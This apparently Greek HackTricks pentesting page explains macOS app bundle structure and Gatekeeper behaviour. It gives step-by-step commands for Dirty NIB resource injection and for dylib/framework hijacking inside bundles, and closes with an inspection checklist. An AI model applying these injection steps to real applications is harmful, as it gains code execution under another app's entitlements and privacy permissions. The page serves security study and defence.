# macOS Πακέτα

{{#include ../../../banners/hacktricks-training.md}}

## Βασικές Πληροφορίες

Τα πακέτα (bundles) στο macOS λειτουργούν ως κοντέινερ για ποικίλους πόρους, συμπεριλαμβανομένων εφαρμογών, βιβλιοθηκών και άλλων απαραίτητων αρχείων, κάνοντάς τα να εμφανίζονται ως ενιαία αντικείμενα στο Finder, όπως τα γνώριμα `*.app` αρχεία. Το πιο συνηθισμένο πακέτο είναι το `.app` bundle, αν και άλλα είδη όπως `.framework`, `.systemextension` και `.kext` είναι επίσης διαδεδομένα.

### Βασικά Στοιχεία ενός Πακέτου

Μέσα σε ένα πακέτο, ειδικά στον κατάλογο `<application>.app/Contents/`, φιλοξενούνται διάφοροι σημαντικοί πόροι:

- **\_CodeSignature**: Αυτός ο κατάλογος αποθηκεύει λεπτομέρειες υπογραφής κώδικα που είναι κρίσιμες για την επαλήθευση της ακεραιότητας της εφαρμογής. Μπορείτε να ελέγξετε τις πληροφορίες υπογραφής κώδικα χρησιμοποιώντας εντολές όπως:
```bash
openssl dgst -binary -sha1 /Applications/Safari.app/Contents/Resources/Assets.car | openssl base64
```
- **MacOS**: Περιέχει το εκτελέσιμο δυαδικό αρχείο της εφαρμογής που εκτελείται όταν ο χρήστης την ενεργοποιεί.
- **Resources**: Αποθετήριο για τα στοιχεία διεπαφής χρήστη της εφαρμογής, όπως εικόνες, έγγραφα και περιγραφές διεπαφής (nib/xib αρχεία).
- **Info.plist**: Λειτουργεί ως το κύριο αρχείο ρυθμίσεων της εφαρμογής, κρίσιμο ώστε το σύστημα να αναγνωρίζει και να αλληλεπιδρά σωστά με την εφαρμογή.

#### Important Keys in Info.plist

Το αρχείο `Info.plist` είναι θεμέλιο για τη ρύθμιση της εφαρμογής, περιέχοντας κλειδιά όπως:

- **CFBundleExecutable**: Καθορίζει το όνομα του κύριου εκτελέσιμου αρχείου που βρίσκεται στον κατάλογο `Contents/MacOS`.
- **CFBundleIdentifier**: Παρέχει έναν παγκόσμιο αναγνωριστικό για την εφαρμογή, που χρησιμοποιείται εκτενώς από το macOS για τη διαχείριση εφαρμογών.
- **LSMinimumSystemVersion**: Δηλώνει την ελάχιστη έκδοση του macOS που απαιτείται για να εκτελεστεί η εφαρμογή.

### Exploring Bundles

Για να εξερευνήσετε τα περιεχόμενα ενός bundle, όπως το `Safari.app`, μπορείτε να χρησιμοποιήσετε την εξής εντολή: `bash ls -lR /Applications/Safari.app/Contents`

Αυτή η εξέταση αποκαλύπτει καταλόγους όπως `_CodeSignature`, `MacOS`, `Resources` και αρχεία όπως `Info.plist`, καθένα εκ των οποίων εξυπηρετεί συγκεκριμένο σκοπό — από την ασφάλεια της εφαρμογής μέχρι τον ορισμό της διεπαφής χρήστη και των λειτουργικών παραμέτρων.

#### Additional Bundle Directories

Πέρα από τους κοινόχρηστους καταλόγους, τα bundles μπορεί επίσης να περιλαμβάνουν:

- **Frameworks**: Περιέχει ενσωματωμένα frameworks που χρησιμοποιεί η εφαρμογή. Τα frameworks είναι σαν dylibs με επιπλέον πόρους.
- **PlugIns**: Κατάλογος για plug-ins και επεκτάσεις που ενισχύουν τις δυνατότητες της εφαρμογής.
- **XPCServices**: Περιέχει XPC services που χρησιμοποιούνται από την εφαρμογή για επικοινωνία εκτός διαδικασίας.

Αυτή η δομή εξασφαλίζει ότι όλα τα απαραίτητα συστατικά είναι ενσωματωμένα μέσα στο bundle, διευκολύνοντας ένα αρθρωτό και ασφαλές περιβάλλον εφαρμογής.

Για πιο λεπτομερείς πληροφορίες σχετικά με τα κλειδιά του `Info.plist` και τη σημασία τους, η τεκμηρίωση για developers της Apple παρέχει εκτενή πόρους: [Apple Info.plist Key Reference](https://developer.apple.com/library/archive/documentation/General/Reference/InfoPlistKeyReference/Introduction/Introduction.html).

## Security Notes & Abuse Vectors

- **Gatekeeper / App Translocation**: Όταν ένα bundle σε καραντίνα εκτελείται για πρώτη φορά, το macOS πραγματοποιεί βαθιά επαλήθευση υπογραφής και μπορεί να το τρέξει από ένα τυχαίο translocated path. Μόλις γίνει αποδεκτό, οι επόμενες εκτελέσεις κάνουν μόνο επιφανειακούς ελέγχους· αρχεία πόρων σε `Resources/`, `PlugIns/`, nibs κ.λπ. ιστορικά δεν ελέγχονταν. Από το macOS 13 Ventura γίνεται επιβολή βαθιού ελέγχου στην πρώτη εκκίνηση και η νέα άδεια TCC *App Management* περιορίζει σε τρίτες διεργασίες τη δυνατότητα τροποποίησης άλλων bundles χωρίς συγκατάθεση χρήστη, αλλά τα παλαιότερα συστήματα παραμένουν ευάλωτα.
- **Bundle Identifier collisions**: Πολλαπλοί ενσωματωμένοι στόχοι (PlugIns, helper tools) που επαναχρησιμοποιούν το ίδιο `CFBundleIdentifier` μπορούν να σπάσουν την επικύρωση υπογραφής και περιστασιακά να επιτρέψουν URL‑scheme hijacking/confusion. Πάντα να απαριθμείτε τα sub‑bundles και να επαληθεύετε μοναδικά IDs.

## Resource Hijacking (Dirty NIB / NIB Injection)

Πριν το Ventura, η αντικατάσταση πόρων UI σε υπογεγραμμένη εφαρμογή μπορούσε να παρακάμψει τον επιφανειακό έλεγχο ψηφιακής υπογραφής και να οδηγήσει σε εκτέλεση κώδικα με τα entitlements της εφαρμογής. Η τρέχουσα έρευνα (2024) δείχνει ότι αυτό εξακολουθεί να λειτουργεί σε συστήματα πριν το Ventura και σε builds που δεν είναι σε καραντίνα:

1. Αντιγράψτε την στοχευόμενη εφαρμογή σε μια εγγράψιμη τοποθεσία (π.χ. `/tmp/Victim.app`).
2. Αντικαταστήστε το `Contents/Resources/MainMenu.nib` (ή οποιοδήποτε nib δηλώνεται στο `NSMainNibFile`) με ένα κακόβουλο που στιγμιοτυπεί `NSAppleScript`, `NSTask`, κ.λπ.
3. Εκκινήστε την εφαρμογή. Το κακόβουλο nib εκτελείται υπό το bundle ID και τα entitlements του θύματος (TCC grants, πρόσβαση μικροφώνου/κάμερας, κ.λπ.).
4. Το Ventura+ μετριάζει το πρόβλημα με βαθιά επαλήθευση του bundle στην πρώτη εκκίνηση και απαιτεί την άδεια *App Management* για μεταγενέστερες τροποποιήσεις, οπότε η επίτευξη persistence γίνεται πιο δύσκολη αλλά οι επιθέσεις στην αρχική εκκίνηση σε παλαιότερα macOS εξακολουθούν να ισχύουν.

Minimal malicious nib payload example (compile xib to nib with `ibtool`):
```bash
# create a nib that runs osascript -e 'do shell script "id"'
# ...build xib in Xcode, then
ibtool --compile MainMenu.nib MainMenu.xib
cp MainMenu.nib /tmp/Victim.app/Contents/Resources/
open /tmp/Victim.app
```
## Framework / PlugIn / dylib Hijacking μέσα σε Bundles

Επειδή οι αναζητήσεις `@rpath` προτιμούν τα ενσωματωμένα Frameworks/PlugIns, η τοποθέτηση μιας κακόβουλης βιβλιοθήκης μέσα σε `Contents/Frameworks/` ή `Contents/PlugIns/` μπορεί να ανακατευθύνει τη σειρά φόρτωσης όταν το κύριο binary είναι υπογεγραμμένο χωρίς επαλήθευση βιβλιοθηκών ή με αδύναμη σειρά `LC_RPATH`.

Τυπικά βήματα όταν εκμεταλλεύεται κανείς ένα μη υπογεγραμμένο/ad‑hoc bundle:
```bash
cp evil.dylib /tmp/Victim.app/Contents/Frameworks/
install_name_tool -add_rpath @executable_path/../Frameworks /tmp/Victim.app/Contents/MacOS/Victim
# or patch an existing load command
install_name_tool -change @rpath/Legit.dylib @rpath/evil.dylib /tmp/Victim.app/Contents/MacOS/Victim
codesign -f -s - --timestamp=none /tmp/Victim.app/Contents/Frameworks/evil.dylib
codesign -f -s - --deep --timestamp=none /tmp/Victim.app
open /tmp/Victim.app
```
Σημειώσεις:
- Το Hardened runtime — όταν το `com.apple.security.cs.disable-library-validation` απουσιάζει — μπλοκάρει third‑party dylibs· έλεγξε πρώτα τα entitlements.
- Οι XPC services κάτω από `Contents/XPCServices/` συχνά φορτώνουν sibling frameworks — patch τα binaries τους με παρόμοιο τρόπο για persistence ή privilege escalation paths.

## Γρήγορος οδηγός επιθεώρησης
```bash
# list top-level bundle metadata
/usr/libexec/PlistBuddy -c "Print :CFBundleIdentifier" /Applications/App.app/Contents/Info.plist

# enumerate embedded bundles
find /Applications/App.app/Contents -name "*.app" -o -name "*.framework" -o -name "*.plugin" -o -name "*.xpc"

# verify code signature depth
codesign --verify --deep --strict /Applications/App.app && echo OK

# show rpaths and linked libs
otool -l /Applications/App.app/Contents/MacOS/App | grep -A2 RPATH
otool -L /Applications/App.app/Contents/MacOS/App
```
## Αναφορές

- [Bringing process injection into view(s): exploiting macOS apps using nib files (2024)](https://sector7.computest.nl/post/2024-04-bringing-process-injection-into-view-exploiting-all-macos-apps-using-nib-files/)
- [Dirty NIB & bundle resource tampering write‑up (2024)](https://karol-mazurek.medium.com/snake-apple-app-bundle-ext-f5c43a3c84c4)
{{#include ../../../banners/hacktricks-training.md}}
